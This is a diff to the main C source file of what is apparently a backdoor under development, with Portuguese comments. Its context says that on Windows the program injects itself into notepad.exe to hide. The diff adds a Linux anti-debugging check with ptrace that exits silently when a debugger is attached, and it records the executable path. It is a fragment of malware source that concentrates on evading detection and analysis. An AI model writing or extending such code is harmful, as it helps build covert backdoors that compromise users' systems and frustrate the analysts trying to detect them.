@@ -18,9 +18,15 @@ terraquian date: 10/05/2019 - 13:21 -PM *** in desenvolpment.
 
 #include "main.h"
 
-int main()
+// Define a variável global que foi declarada em main.h
+const char* g_executable_path = NULL;
+
+int main(int argc, char *argv[])
 
 {
+    // Armazena o caminho do executável para uso em outras funções
+    g_executable_path = argv[0];
+
     #if defined(_WIN32) || defined(_WIN64)
         // No Windows, em vez de rodar diretamente, vamos nos injetar
         // em um processo legítimo para nos escondermos.
@@ -42,6 +48,15 @@ int main()
         // pode se encerrar, pois o backdoor agora está rodando dentro do notepad.exe.
         // A lógica abaixo NUNCA seria executada pelo processo original.
         // Ela só existe para ser injetada.
+    #else // Lógica para Linux/Unix
+        #include <sys/ptrace.h>
+
+        // Técnica Anti-Debug: Impede que outro depurador se anexe.
+        if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
+            // Se a chamada falhar, pode ser porque já estamos sendo depurados.
+            // Encerra silenciosamente.
+            exit(0);
+        }
     #endif
 
     // =======================================================================
@@ -65,12 +80,6 @@ int main()
 
         return 0; // Inalcançável, mas bom para completude.
 }
-
-
-
-
-
-
 
 // End Main
 
